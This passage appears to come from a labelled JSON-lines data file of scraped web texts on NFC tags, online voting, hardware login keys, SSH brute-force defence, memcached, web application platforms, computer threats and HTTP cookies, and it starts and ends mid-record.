cafe that wants to limit access to the local hotspot might let patrons tap their phones against a tag instead of having them laboriously enter a password.\n\"There’s been an over-focus on the wallets,\" Holland said. \"It’s a technology that’s not designed purely for payments.\"\nFor advertisers, NFC tags could replace the so-called \"QR\" codes - two-dimensional bar codes that need to be photographed with specially downloaded software to be deciphered, so they can send a consumer to the advertiser’s website or earn them a coupon for a discount. QR codes work at a distance, unlike NFC tags, but have significant drawbacks.\n\"Someone described them as ’digital vomit’ recently. You can’t make them look pretty,\" Holland said.\nEach NFC tag includes a tiny chip, which explains the relatively high prices Samsung and Sony are charging. Those prices will come down, Holland said, as adoption rises. QR codes, of course, have the advantage of being very cheap, since they can be created on a simple printer.\nThe big makers of NFC chips are NXP Semiconductors N.V., a Dutch company, and Inside Secure, a French one. But competition is looming, Holland said, from bigger chip companies like Broadcom Corp. and Texas Instruments Inc.\n\"Basically, anyone who’s making chips is looking at NFC as a new area they could move into,\" Holland said.", "label": 1}
{"text": "is popular among young people. Voting, however, is not popular\namong young people. Participating in politics is important. Those\nwho don't vote must watch while politicians divvy up the available\nmoney and services without their input. What better way to use\ntechnology is there than to enable more young people to vote and\nbe politically aware?\nof voting online isn't new; it's similar to voting by mail except\nthat the ballots are submitted via keystroke rather than via the\nPostal Service. There are concerns that people with more wealth\nand better education--who tend to use the Internet in greater\nnumbers--would skew online elections. However, the point is missed\nthat, due to the present election structure, richer people already\nhave a disproportionate say in who is elected.\ncannot add any more weight to a seesaw that already has one side\non the ground, but it can induce more people to participate. Already,\ndozens of candidates and organizations have Web sites with much\nmore in-depth information than any 30-second commercial can include.\nfrom the Knight-Ridder News Service included the point that \"Californians\ncould be voting over the Internet in five years with a computerized\nsystem that could revolutionize the state's voting process and\nboost sagging voter turnout.\nof State Bill Jones is recruiting Silicon Valley's high-tech companies\nto study how to make such a system private and secure from fraud.\nMomentum is already building nationwide from a pilot project that\nwould let some overseas military personnel cast votes over the\nInternet in the November 2000 election.\"\nis already under development. Again, modifying the secure servers\nthat have enabled e-commerce to flourish in the last few years\nwill allow honest elections to be held online. Janelle Brown,\ntechnology correspondent for Salon, said in an interview that\nthe necessary technology could be available within the next five\ncompanies are working on election server technology including\nVotehere, which was profiled in the New York Times this spring.\n\"As president of Votehere.net, a start-up company that builds\nsecure Internet voting systems, Jim Adler hears the same question\nfrom investors again and again. They don't ask about politics\nor security. They want to know what would happen if Microsoft\nmoved into the election business. Adler has a ready reply: 'Do\nyou think the Justice Department would let Microsoft run elections\nin this country?'\nare focusing their efforts on building the trust of election officials\nin their products and reputations. Votehere.net is new to the\nindustry, but most of these companies are already in the election\nbusiness, selling voting machines and computer equipment for reading\nballot results, and they are anticipating demand for Internet\nconcern with online voting boils down to trust. Kim Alexander,\npresident of the non-profit California Voter Foundation, said\nthat personal, not technical, issues were the key stumbling block\ntoward acceptance of online voting. \"A CVF survey showed that\nmembers were supportive with caution,\" Alexander said in an interview.\n\"I see online voting supplementing polling places. It will be\na generation before there is more confidence. The state should\nprovide more information to ease fears.\"\n\"There is little trust in what is online,\" she said. \"There is\na lack of familiarity. People don't trust interaction with a machine.\nIt's not something they're familiar with.\"\ncomes to using a computer to vote, Brown predicted that people\nwill initially be reticent, but it will pass with time.\nBrown nor Alexander believed that the Democrats or the Republicans\nwould be helped or hurt by Internet voting. Alexander ventured\nthat more independent voters might participate.\ndescribed a school of thought that believes \"voting should be\ndifficult.\" That thinking certainly is consistent with America's\nvoting history, starting with the Constitution, which permitted\nonly white, middle-aged men with property to vote. Therefore,\nit is odd that critics of Internet voting cite a lack of access\nas an issue. From grandfather clauses to literacy tests to poll\ntaxes, suffrage has expanded only slowly and grudgingly.\neven more reason to provide more opportunity to express their\nviews. The technology, when it is available, must be allowed to\noperate effectively. Education, not fear, must be the impetus\nbehind improving political participation.\nthanks to Kim Alexander and Janelle Brown for their time and assistance.\ntaken from \"Californians might soon be voting online\" an article\nby Deborah Kong, Knight-Ridder News Service, dated Aug. 8, 1998.\ntaken from \"Casting Ballots Through the Internet\" an article by\nRebecca Fairley Raney, New York Times on the Web, dated May 3,\n© 2000 Tyson Chaney All Rights Reserved\nis executive director of the Millennium 3 Foundation, a non-profit,\nnon-partisan political research and education organization. He\nis writing a book, Millennium 3: Political Theory in the Twenty-First\nCentury, that will be published later this year.\ndiscuss this article on our discussion", "label": 1}
{"text": "One Ring to Log In All\nThe YubiKey is a device that adds a layer of security to logging into online accounts. Google engineers are experimenting with YubiKeys and other schemes for added protection.\nCREDIT: From \"YubiKey NEO - World's first NFC enabled one-time password tokenM\" by Yubico on YouTube\nGoogle is working on small devices — including one designed as a ring — that people would need to log onto all of their online accounts, Wired reported. Such devices could add a layer of security to online email, banking and other accounts, but they could also add another necessity for people to carry around in their purses or wallets.\nGoogle's security team are experimenting with extra log-in hardware because they thought passwords aren't enough to deter hackers anymore, Wired reported. Because of the increasing sophistication of hacks, everything that is now password-protected might in the future require some kind of personal key, too, the Google researchers thought.\nGoogle has experimented with YubiKey, a small card that plugs into computers' USB ports. They also imagined that tomorrow's Internet keys could be built into rings or smartphones, which would eliminate the need to carry around an extra device. The jewelry and smartphone-based keys could work with a tap.\nOne of the major challenges now is to convince other websites to agree to a unified log-in system.\nGoogle's ideas for increasing the security of online accounts are alternatives to another popular idea, adding biometrics such as iris or fingerprint scans to people's personal devices.", "label": 1}
{"text": "But what if an attacker doesn't care about getting access to a specific system? After all, trying 10,000 passwords against a server would most likely cause a target account to be locked out.\nInstead, a malicious hacker could attempt password attacks on a large scale, using the same username and password combination on 10,000 systems. That would result in only one failed log-in attempt per server, but a much better chance of successfully compromising at least one.\nLately, attackers have been using the \"low and slow\" tactic, employing botnets against large numbers of servers. The technique gives them the ability to launch large-scale attacks from multiple sources.\nDefending against these SSH brute-force attacks means going back to the basics of solid security practices. To start, utilize passwords and passphrases that will not be easily guessed. Doing standard \"Leetspeak\" -- an Internet language that substitutes letters with ASCII characters -- will not work. Attackers now use custom dictionaries that incorporate the common Leet substitutions used by sysadmins, like \"@\" for \"a\" and \"3\" for \"e.\"\nAlso, make the root password inaccessible via a direct SSH connection by setting 'DenyUsers root' and 'PermitRootLogin no' in your sshd_config file. The majority of password attacks I've seen lately have been against the root account on systems.\nThis was first published in January 2009", "label": 1}
{"text": "Distributed Caching with Memcached\nMemcached is a high-performance, distributed caching system. Although application-neutral, it's most commonly used to speed up dynamic Web applications by alleviating database load. Memcached is used on LiveJournal, Slashdot, Wikipedia and other high-traffic sites.\nFor the past eight years I've been creating large, interactive, database-backed Web sites spanning multiple servers. Approximately 70 machines currently run LiveJournal.com, a blogging and social networking system with 2.5 million accounts. In addition to the typical blogging and friend/interest/profile declaration features, LiveJournal also sports forums, polls, a per-user news aggregator, audio posts by phone and other features useful for bringing people together.\nOptimizing the speed of dynamic Web sites is always a challenge, and LiveJournal is no different. The task is made all the more challenging, because nearly any content item in the system can have an associated security level and be aggregated into many different views. From prior projects with dynamic, context-aware content, I knew from the beginning of LiveJournal's development that pregenerating static pages wasn't a viable optimization technique. It's impossible due to the constituent objects' cacheability and lifetimes being so different, so you make a bunch of sacrifices and waste a lot of time precomputing pages more often than they're requested.\nThis isn't to say caching is a bad thing. On the contrary, one of the core factors of a computer's performance is the speed, size and depth of its memory hierarchy. Caching definitely is necessary, but only if you do it on the right medium and at the right granularity. I find it best to cache each object on a page separately, rather than caching the entire page as a whole. That way you don't end up wasting space by redundantly caching objects and template elements that appear on more than one page.\nIn the end, though, it's all a series of trade-offs. Because processors keep getting faster, I find it preferable to burn CPU cycles rather than wait for disks. Modern disks keeping growing larger and cheaper, but they aren't getting much faster. Considering how slow and crash-prone they are, I try to avoid disks as much as possible. LiveJournal's Web nodes are all diskless, Netbooting off a common yet redundant NFS root image. Not only is this cheaper, but it requires significantly less maintenance.\nOf course, disks are necessary for our database servers, but there we stick to fast disks with fast RAID setups. We actually have ten different database clusters, each with two or more machines. Nine of the clusters are user clusters, containing data specific to the users partitioned among them. One is our global cluster with non-user data and the table that maps users to their user clusters. The rationale for independent clusters is to spread writes. The alternative is having one big cluster with hundreds of slaves. The difficulty with such a monolithic cluster is it only spreads reads. The problem of diminishing returns appears as each new slave is added and increasingly is consumed by the writes necessary to stay up to date.\nAt this point you can see LiveJournal's back-end philosophy:\nAvoid disks: they're a pain. When necessary, use only fast, redundant I/O systems.\nScale out, not up: many little machines, not big machines.\nMy definition of a little machine is more about re-usability than cost. I want a machine I can keep using as long as it's worth its space and heat output. I don't want to scale by throwing out machines every six months, replacing them with bigger machines.\nPrior to Memcached, our Web nodes unconditionally hit our databases. This worked, but it wasn't as optimal as it could've been. I realized that even with 4G or 8G of memory, our database server caches were limited, both in raw memory size and by the address space available to our database server processes running on 32-bit machines. Yes, I could've replaced all our databases with 64-bit machines with much more memory, but recall that I'm stubborn and frugal.\nI wanted to cache more on our Web nodes. Unfortunately, because we're using mod_perl 1.x, caching is a pain. Each process and thus, each Web request, is in its own address space and can't share data with the others. Each of the 30–50 processes could cache on its own, but doing so would be wasteful.\nSystem V shared memory has too many weird limitations and isn't portable. It also works only on a single machine, not across 40+ Web nodes. These issues reflect what I saw as the main problem with most caching solutions. Even if our application platform was multithreaded with data easily shared between processes, we still could cache on only a single machine. I didn't want all 40+ machines caching independently and duplicating information.\n|Using Salt Stack and Vagrant for Drupal Development||May 20, 2013|\n|Making Linux and Android Get Along (It's Not as Hard as It Sounds)||May 16, 2013|\n|Drupal Is a Framework: Why Everyone Needs to Understand This||May 15, 2013|\n|Home, My Backup Data Center||May 13, 2013|\n|Non-Linux FOSS: Seashore||May 10, 2013|\n|Trying to Tame the Tablet||May 08, 2013|\n- RSS Feeds\n- Making Linux and Android Get Along (It's Not as Hard as It Sounds)\n- New Products\n- Drupal Is a Framework: Why Everyone Needs to Understand This\n- A Topic for Discussion - Open Source Feature-Richness?\n- Home, My Backup Data Center\n- Validate an E-Mail Address with PHP, the Right Way\n- Tech Tip: Really Simple HTTP Server with Python\n- New Products\n- Trying to Tame the Tablet\n- git-annex assistant\n5 hours 37 min ago\n- direct cable connection\n5 hours 59 min ago\n- Agreed on AirDroid. With my\n6 hours 10 min ago\n- I just learned this\n6 hours 14 min ago\n6 hours 44 min ago\n- not living upto the mobile revolution\n9 hours 35 min ago\n- Deceptive Advertising and\n10 hours 11 min ago\n- Let\\'s declare that you have\n10 hours 12 min ago\n- Alterations in Contest Due\n10 hours 13 min ago\n- At a numbers mindset, your\n10 hours 14 min ago\nEnter to Win an Adafruit Prototyping Pi Plate Kit for Raspberry Pi\nIt's Raspberry Pi month at Linux Journal. Each week in May, Adafruit will be giving away a Pi-related prize to a lucky, randomly drawn LJ reader. Winners will be announced weekly.\nFill out the fields below to enter to win this week's prize-- a Prototyping Pi Plate Kit for Raspberry Pi.\nCongratulations to our winners so far:\n- 5-8-13, Pi Starter Pack: Jack Davis\n- 5-15-13, Pi Model B 512MB RAM: Patrick Dunn\n- Next winner announced on 5-21-13!\nFree Webinar: Linux Backup and Recovery\nMost companies incorporate backup procedures for critical data, which can be restored quickly if a loss occurs. However, fewer companies are prepared for catastrophic system failures, in which they lose all data, the entire operating system, applications, settings, patches and more, reducing their system(s) to “bare metal.” After all, before data can be restored to a system, there must be a system to restore it to.\nIn this one hour webinar, learn how to enhance your existing backup strategies for better disaster recovery preparedness using Storix System Backup Administrator (SBAdmin), a highly flexible bare-metal recovery solution for UNIX and Linux systems.", "label": 1}
{"text": "What is a web application?\nBy \"web applications\", I mean interactive programs which run on any platform, and use, process or (often) display data available on a server. One important characteristic of such applications is that they run within the browser. Doing so has several important implications -- most of them security related. Web applications can only connect to the server they came from. If that weren't the case, I could create a web page with the \"small\" side effect of getting unaware visiting users to launch Denial Of Service attacks against anybody. Also, an application that runs within the browser can't access directly the local hardware and file system in order to prevent viruses and spyware.\nLoser #1: Java\nJava was created by Sun Microsystems, and -- most importantly -- was included in Netscape Navigator in 1995. That's 13 years ago! Java uses a virtual machine; this means that Java programs will run anywhere as long as a Java virtual machine is available. Java allows developers to create \"Java applets\" and \"Java applications\". The main difference is security (see the textbox): Java applets are expected to be found embedded in web pages, rather than installed, and therefore don't have full access to the underlying hardware. In 2008, I don't remember having seen a web page which included a Java applet for at least 5 years. Java has its niche markets: Java Server Pages (to create web applications ala PHP) and mobile devices (to create small applications). Android will probably push Java further (although it only uses Java as a language, rather than using the Java Virtual Machine). However, again, Java is nowhere to be seen in web pages.\nWhy? Because for the first 12 years of its life, Java's been proprietary. (Things are changing now. \"Too little, too late\".) Courageous people tried to write free, competing virtual machines, and managed. However, the problem was in the important Java libraries which Sun kept under a closed license for years and years and years. I am convinced that this problem also had technical repercussions on Java as a platform: Java applet were famous for crashing people's browsers in 1995 -- and they are still famous today for being immensely heavy and memory-hungry. I can only wonder how much better Java would be if the whole community were able to improve it and its libraries. Many also argue that the Java Virtual Machine -- and Java as a language -- is hardly fixable: the post I hate Java summarises some of the problems. (But, it is biased!) So, Java had all of the ingredients to become king in the web application domain: it was first, it was available in Windows and GNU/Linux, and it was ready. And yet, it was a closed platform and it had arguably big technical problems.\nLoser #2: Flash\nJust like Java, Flash was available very early, in 1997. Web authors could develop nice animations and more. It was better than Java (it didn't kill your browser) and it was easier to program. Fast-forward 11 years: Flash's main use is in video playing, and very little more. Adobe (which owns Flash) realised the potential of internet applications, and (about three years ago) released Flex. Flex, in oversimplifying terms, can be seen as a way for developers to create Flash files, using advanced libraries and advanced tools. Flex is absolutely fantastic.\nThe problem is that while the Flash player is \"free\" (that is, it doesn't cost anything although its source code is not available), Flex is outrageously expensive. And proprietary. [UPDATE: no, it's not expensive. It's been open sourced, and you don't need a Flex server to deploy Flex applications -- thanks Ben Forta!] And it creates applications running in a proprietary player (Flash). I have seen Flex. I have met some of the programmers who worked on it. They knew what they were doing. They were smart. They knew the internet -- I considered them internet magicians. However, nobody likes to fork out large sums of money in order to buy (or deploy) the development tools [UPDATE: this is no longer an issue], and nobody likes the idea of depending completely on the financial health and ethical principles of a single company. I think Flash and Flex are way superior to anything I have ever seen. If the Flash player were released under the GPL, its specifications fully documented [Note: this is still absolutely crucial], and Flex was released under a free license (maybe BSD-like?), then there could be a big chance of a huge market shift towards Adobe's technologies. Trouble is, it's not going to happen -- and it might even be too late.\nLoser #3: Silverlight\n.NET is Microsoft's answer to Java: it compiles things into bytecode, it's multi-platform, etc. Technically, many argue that it's \"Java as it should have been\". .NET isn't free: while the virtual machine and the language itself are ECMA standards, Microsoft's GUI libraries and other key components aren't. This means (surprise surprise) that you can't write a .NET program for Microsoft Windows, and run it under GNU/Linux, even though there is a .NET virtual machine for GNU/Linux (called \"Mono\"). If .NET is Microsoft's answer to Java, Silverlight is Microsoft's answer to Flash. Silverlight allows you to run .NET applications within your browser. The site silverlight.net is Silverlight's official web page. Although it's defined \"Multi platform\" by Microsoft itself, GNU/Linux is completely ignored (there are Windows and Apple downloads).\nSilverlight might erode Flash's tiny market. I don't think there's any difference between Flash and Silverlight: two competing products which are losing the Web Application race.\nWhy did such an unlikely combination win such an important war? Because it's based on available, open, free technologies. People don't have to spend thousands of dollars to write Flex applications. People don't have to install Microsoft Visual Studio for Silverlight. And don't have to battle the technical difficulties of Java (if it were still an option).\nWelcome to 2008.", "label": 1}
{"text": "Types of attacks your computer may suffer from on the net\nIf you surf the internet on a regular basis, then you must realize that your computer gets exposed to a variety of threats from the internet. Viruses, spyware, worms, and malware, everything is waiting to skim through your PC, scanning its contents and altering its components. Even more dangerous are hackers, who primarily target the sensitive data stored in your PC, including your e-mail passwords, and most importantly, your credit card numbers that you may provide to secure websites when purchasing something through online stores. Let us look into these threats individually:\n- Viruses – Computer viruses have always been the cause for alarm among PC users. Viruses work in different ways; some can slow down your PC to a crawl, others can wipe out data from your hard drive, corrupt system files and generally wreck havoc on your PC. Viruses are very dangerous, and you should always install some good antivirus software on your PC and keep it updated regularly. Scan your PC with this regularly to make sure that it is free from viruses and if not, learn how to find out which virus is on your computer.\n- Worms – These are not anywhere near viruses in danger factor, but can be pretty annoying. These malicious bits of software can stay resident in the memory, thereby slowing down your PC, sapping away RAM, interfering with the speed of your internet connection, and what not. What’s worse is that these often have a nasty habit of sending e-mails to every contact in your address book. Not a good thing. However, a good quality antivirus will be able to keep most worms at bay.\n- Spyware – These are small bits of malicious software that usually infiltrate your PC through certain websites. These usually get installed without user intervention, which means that you will not even know when your PC is getting infected by a spyware, unless you receive a intrusion warning message from your antivirus or firewall. Spywares can be dangerous when these enter your PC, because these can act as keyloggers, tapping into your key presses and sending information about those through the internet to the people who created the spyware in the first place.\n- Malware – These are similar to spyware, in that these often have similar ways of working. The main difference is that these usually pose a very innocent face up front, so in most cases, you will be installing these programs inadvertently in your PC.\nYour PC has to withstand many attacks in the form of one or more of these threats on a regular basis, whenever you are connected to the internet. Keep a good firewall and antivirus installed in your PC, to make sure that the dangerous denizens of the Internet leave your PC alone.\nRelated article: Malicious programs descriptions\nOld drivers harm system performance and make your PC vulnerable to errors and crashes.\nPosted in Internet Security", "label": 1}
{"text": "A cookie, also known as an HTTP cookie, web cookie, or browser cookie, is a small piece of data sent from a website and stored in a user's web browser while a user is browsing a website. When the user browses the same website in the future, the data stored in the cookie can be retrieved by the website to notify the website of the user's previous activity. Cookies were designed to be a reliable mechanism for websites to remember the state of the website or activity the user had taken in the past. This can include clicking particular buttons, logging in, or a record of which pages were visited by the user even months or years ago.\nAlthough cookies cannot carry viruses, and cannot install malware on the host computer, tracking cookies and especially third-party tracking cookies are commonly used as ways to compile long-term records of individuals' browsing histories — a major privacy concern that prompted European and US law makers to take action in 2011. Cookies can also store passwords and forms a user has previously entered, such as a credit card number or an address. When a user accesses a Web site with a cookie function for the first time, a cookie is sent from server to the browser and stored with the browser in the local computer. Later when that user goes back to the same website, the website will recognize the user because of the stored cookie with the user's information.\nOther kinds of cookies perform essential functions in the modern Web. Perhaps most importantly, authentication cookies are the most common method used by web servers to know whether the user is logged in or not, and which account they are logged in under. Without such a mechanism, the site would not know whether to send a page containing sensitive information, or require the user to authenticate himself by logging in. The security of an authentication cookie generally depends on the security of the issuing website and the user's web browser, and on whether the cookie data is encrypted. Security vulnerabilities may allow a cookie's data to be read by a hacker, used to gain access to user data, or used to gain access (with the user's credentials) to the website to which the cookie belongs (see cross-site scripting and cross-site request forgery for examples).\nThe term \"cookie\" was derived from \"magic cookie\", which is the packet of data a program receives and sends again unchanged. Magic cookies were already used in computing when computer programmer Lou Montulli had the idea of using them in Web communications in June 1994. At the time, he was an employee of Netscape Communications, which was developing the e-commerce application \"MCI Mall\" for MCI. Vint Cerf and John Klensin represented MCI in technical discussions with Netscape Communications. Not wanting the MCI Mall servers to have to retain partial transaction states led to MCI's request to Netscape to find a way to store that state in each user's computer. Cookies provided a solution to the problem of reliably implementing a virtual shopping cart.\nThe introduction of cookies was not widely known to the public at the time. In particular, cookies were accepted by default, and users were not notified of the presence of cookies. The general public learned about them after the Financial Times published an article about them on February 12, 1996. In the same year, cookies received a lot of media attention, especially because of potential privacy implications. Cookies were discussed in two U.S. Federal Trade Commission hearings in 1996 and 1997.\nThe development of the formal cookie specifications was already ongoing. In particular, the first discussions about a formal specification started in April 1995 on the www-talk mailing list. A special working group within the IETF was formed. Two alternative proposals for introducing state in HTTP transactions had been proposed by Brian Behlendorf and David Kristol respectively, but the group, headed by Kristol himself and Aron Afatsuom, soon decided to use the Netscape specification as a starting point. In February 1996, the working group identified third-party cookies as a considerable privacy threat. The specification produced by the group was eventually published as RFC 2109 in February 1997. It specifies that third-party cookies were either not allowed at all, or at least not enabled by default.\nAt this time, advertising companies were already using third-party cookies. The recommendation about third-party cookies of RFC 2109 was not followed by Netscape and Internet Explorer. RFC 2109 was superseded by RFC 2965 in October 2000.\nA definitive specification for cookies as used in the real world was published as RFC 6265 in April 2011.\n||This section needs additional citations for verification. (August 2011)|\nA user's session cookie (also known as an in-memory cookie or transient cookie) for a website exists in temporary memory only while the user is reading and navigating the website. When an expiry date or validity interval is not set at cookie creation time, a session cookie is created. Web browsers normally delete session cookies when the user closes the browser.\nA persistent cookie will outlast user sessions. If a persistent cookie has its Max-Age set to 1 year, then, within the year, the initial value set in that cookie would be sent back to the server every time the user visited the server. This could be used to record a vital piece of information such as how the user initially came to this website. For this reason persistent cookies are also called tracking cookies.\nA secure cookie has the secure attribute enabled and is only used via HTTPS, ensuring that the cookie is always encrypted when transmitting from client to server. This makes the cookie less likely to be exposed to cookie theft via eavesdropping.\nFirst-party cookies are cookies set with the same domain (or its subdomain) as your browser's address bar. Third-party cookies are cookies set with domains different from the one shown on the address bar. The web pages on the first domain may feature content from a third-party domain, e.g. a banner advert run by\nwww.advexample.com. Privacy setting options in most modern browsers allow you to block third-party tracking cookies.\nAs an example, suppose a user visits\nwww.example1.com, which includes an advert which sets a cookie with the domain\nad.foxytracking.com. When the user later visits\nwww.example2.com, another advert can set another cookie with the domain\nad.foxytracking.com. Eventually, both of these cookies will be sent to the advertiser when loading their ads or visiting their website. The advertiser can then use these cookies to build up a browsing history of the user across all the websites this advertiser has footprints on.\nA \"supercookie\" is a cookie with an origin of a Top-Level Domain (TLD) or an effective Top-Level Domain. Some domains that are considered, \"Top-Level\" may in fact be a secondary or lower-level domain. For example,\nk12.ca.us are considered Top-Level even though they are multiple levels deep. These domains are referred to as Public Suffixes and are not open for reservation by end-users.\nMost browsers, by default, allow first-party cookies—a cookie with domain to be the same or sub-domain of the requesting host. For example, a user visiting\nwww.example.com can have a cookie set with domain\n.example.com. A so-called \"supercookie\" is a cookie originating from a Public Suffix or Top-Level Domain such as,\n.com. It is important that these cookies are blocked by browsers otherwise, an attacker in control of malicious website with domain\n.com could set a \"supercookie\" and potentially disrupt or impersonate legitimate user requests to\nexample.com. Thus taking advantage of the fact that\n.com can set valid cookies for sub-domain\nThe Public Suffix List is a cross-vendor initiative to provide an accurate list of domain name suffixes changing. Older versions of browsers may not have the most up-to-date list, and will therefore be vulnerable to supercookies from certain domains.\nThe term \"supercookie\" is sometimes used for tracking technologies that do not rely on HTTP cookies. Two such \"supercookie\" mechanisms were found on Microsoft websites: cookie syncing that respawned MUID cookies, and ETag cookies. Due to media attention, Microsoft later disabled this code:\nIn response to recent attention on \"supercookies\" in the media, we wanted to share more detail on the immediate action we took to address this issue, as well as affirm our commitment to the privacy of our customers. According to researchers, including Jonathan Mayer at Stanford University, \"supercookies\" are capable of re-creating users' cookies or other identifiers after people deleted regular cookies. Mr. Mayer identified Microsoft as one among others that had this code, and when he brought his findings to our attention we promptly investigated. We determined that the cookie behavior he observed was occurring under certain circumstances as a result of older code that was used only on our own sites, and was already scheduled to be discontinued. We accelerated this process and quickly disabled this code. At no time did this functionality cause Microsoft cookie identifiers or data associated with those identifiers to be shared outside of Microsoft.—Mike Hintze\nSome cookies are automatically recreated after a user has deleted them; these are called zombie cookies. This is accomplished by a script storing the content of the cookie in some other locations, such as the local storage available to Flash content, HTML5 storages and other client side mechanisms, and then recreating the cookie from backup stores when the cookie's absence is detected.\n1. Name of the cookie\n2. Value of the cookie\n3. The expiry of the cookie (using Greenwich Mean Time)\n4. The path the cookie is good for\n5. The domain the cookie is good for\n6. The need for a secure connection to use the cookie\nOnly the first two parameters are required for the successful operation of the cookie.\nSession management \nCookies may be used to maintain data related to the user during navigation, possibly across multiple visits. Cookies were introduced to provide a way to implement a \"shopping cart\" (or \"shopping basket\"), a virtual device into which users can store items they want to purchase as they navigate throughout the site.\nShopping basket applications today usually store the list of basket contents in a database on the server side, rather than storing basket items in the cookie itself. A web server typically sends a cookie containing a unique session identifier. The web browser will send back that session identifier with each subsequent request and shopping basket items are stored associated with a unique session identifier.\nCookies provide a quick and convenient means of client/server interaction. One of the advantages of cookies lies in the fact that they store the user information locally while identifying users simply based on cookie matching. The server's storage and retrieval load is greatly reduced. As a matter of fact, the possibility of applications is endless - anytime personal data need to be saved they can be saved as a cookie (Kington, 1997).\nCookies may be used to remember the information about the user who has visited a website in order to show relevant content in the future. For example a web server may send a cookie containing the username last used to log into a website so that it may be filled in for future visits.\nTracking cookies may be used to track internet users' web browsing. This can also be done in part by using the IP address of the computer requesting the page or the referrer field of the HTTP request header, but cookies allow for greater precision. This can be demonstrated as follows:\n- If the user requests a page of the site, but the request contains no cookie, the server presumes that this is the first page visited by the user; the server creates a random string and sends it as a cookie back to the browser together with the requested page;\n- From this point on, the cookie will automatically be sent by the browser to the server every time a new page from the site is requested; the server sends the page as usual, but also stores the URL of the requested page, the date/time of the request, and the cookie in a log file.\nBy analyzing the log file collected in the process, it is then possible to find out which pages the user has visited, in what sequence, and for how long.\nCookie specifications suggest that browsers should be able to save and send back a minimal number of cookies. In particular, a web browser is expected to be able to store at least 300 cookies of four kilobytes each, and at least 20 cookies per server or domain.\nTransfer of Web pages follows the HyperText Transfer Protocol (HTTP). Regardless of cookies, browsers request a page from web servers by sending them a usually short text called HTTP request. For example, to access the page http://www.example.org/index.html, browsers connect to the server www.example.org sending it a request that looks like the following one:\nThe server replies by sending the requested page preceded by a similar packet of text, called 'HTTP response'. This packet may contain lines requesting the browser to store cookies:\nThe server sends lines of\nSet-Cookie only if the server wishes the browser to store cookies.\nSet-Cookie is a directive for the browser to store the cookie and send it back in future requests to the server (subject to expiration time or other cookie attributes), if the browser supports cookies and cookies are enabled. For example, the browser requests the page http://www.example.org/spec.html by sending the server www.example.org a request like the following:\nThis is a request for another page from the same server, and differs from the first one above because it contains the string that the server has previously sent to the browser. This way, the server knows that this request is related to the previous one. The server answers by sending the requested page, possibly adding other cookies as well.\nThe value of a cookie can be modified by the server by sending a new\nSet-Cookie: name=newvalue line in response of a page request. The browser then replaces the old value with the new one.\nThe value of a cookie may consist of any printable ascii character (\n; and excluding whitespace. The name of the cookie also excludes\n= as that is the delimiter between the name and value. The cookie standard RFC2965 is more limiting but not implemented by browsers.\nThe term \"cookie crumb\" is sometimes used to refer to the name-value pair. This is not the same as breadcrumb web navigation, which is the technique of showing in each page the list of pages the user has previously visited; this technique, however, may be implemented using cookies.\ndocument.cookie is used for this purpose. For example, the instruction\ndocument.cookie = \"temperature=20\" creates a cookie of name\ntemperature and value\nCookie attributes \nBesides the name–value pair, servers can also set these cookie attributes: a cookie domain, a path, expiration time or maximum age, Secure flag and HttpOnly flag. Browsers will not send cookie attributes back to the server. They will only send the cookie’s name-value pair. Cookie attributes are used by browsers to determine when to delete a cookie, block a cookie or whether to send a cookie (name-value pair) to the servers.\nDomain and Path \nThe cookie domain and path define the scope of the cookie—they tell the browser that cookies should only be sent back to the server for the given domain and path. If not specified, they default to the domain and path of the object that was requested. An example of Set-Cookie directives from a website after a user logged in:\nThe first cookie\nLSID has default domain\ndocs.foo.com and Path\n/accounts, which tells the browser to use the cookie only when requesting pages contained in\ndocs.foo.com/accounts. The other 2 cookies\nSSID would be sent back by the browser while requesting any subdomain in\n.foo.com on any path, for example\nCookies can only be set on the top domain and its sub domains. Setting cookies on\nwww.bar.com will not work for security reasons.\nExpires and Max-Age \nThe Expires directive tells the browser when to delete the cookie. Derived from the format used in RFC 1123, the date is specified in the form of “Wdy, DD Mon YYYY HH:MM:SS GMT”, indicating the exact date/time this cookie will expire. As an alternative to setting cookie expiration as an absolute date/time, RFC 6265 allows the use of the Max-Age attribute to set the cookie’s expiration as an interval of seconds in the future, relative to the time the browser received the cookie. An example of Set-Cookie directives from a website after a user logged in:\nThe first cookie\nlu is set to expire sometime in 15-Jan-2013; it will be used by the client browser until that time. The second cookie\nmade_write_conn does not have an expiration date, making it a session cookie. It will be deleted after the user closes their browser. The third cookie\nreg_fb_gate has its value changed to deleted, with an expiration time in the past. The browser will delete this cookie right away – note that cookie will only be deleted when the domain and path attributes in the\nSet-Cookie field match the values used when the cookie was created.\nSecure and HttpOnly \nThe Secure and HttpOnly attributes do not have associated values. Rather, the presence of the attribute names indicates that the Secure and HttpOnly behaviors are specified.\nBrowser settings \nMost modern browsers support cookies and allow the user to disable them. The following are common options:\n- To enable or disable cookies completely, so that they are always accepted or always blocked.\n- Some browsers incorporate a cookie manager for the user to see and selectively delete the cookies currently stored in the browser.\n- By default, Internet Explorer allows only third-party cookies that are accompanied by a P3P \"CP\" (Compact Policy) field.\nAdvertising companies use third-party cookies to track a user across multiple sites. In particular, an advertising company can track a user across all pages where it has placed advertising images or web bugs. Knowledge of the pages visited by a user allows the advertising company to target advertisements to the user's presumed preferences.\nThe possibility of building a profile of users is considered by some a potential privacy threat, especially when tracking is done across multiple domains using third-party cookies. For this reason, some countries have legislation about cookies.\nThe United States government has set strict rules on setting cookies in 2000 after it was disclosed that the White House drug policy office used cookies to track computer users viewing its online anti-drug advertising. In 2002, privacy activist Daniel Brandt found that the CIA had been leaving persistent cookies on computers which had visited its website. When notified it was violating policy, CIA stated that these cookies were not intentionally set and stopped setting them. On December 25, 2005, Brandt discovered that the National Security Agency (NSA) had been leaving two persistent cookies on visitors' computers due to a software upgrade. After being informed, the National Security Agency immediately disabled the cookies.\nEU Cookie Law \nIn 2002, the European Union launched the Directive on Privacy and Electronic Communications, a policy requiring end users’ consent for the placement of cookies, and similar technologies for storing and accessing information on users’ equipment. In particular, Article 5 Paragraph 3 mandates that storing data in a user’s computer can only be done if the user is provided information about how this data is used, and the user is given the possibility of denying this storing operation.\nDirective 95/46/EC defines ‘the data subject’s consent’ as: “any freely given specific and informed indication of his wishes by which the data subject signifies his agreement to personal data relating to him being processed”. Consent must involve some form of communication where individuals knowingly indicate their acceptance.\nIn 2009, the policy was amended by Directive 2009/136/EC, which included a change to Article 5 Paragraph 3. Instead of having an option for users to opt out of cookie storage, the revised Directive requires consent to be obtained for cookie storage.\nIn June 2012, European data protection authorities adopted an opinion which clarifies that some cookie users might be exempt from the requirement to gain consent:\n- Some cookies can be exempted from informed consent under certain conditions if they are not used for additional purposes. These cookies include cookies 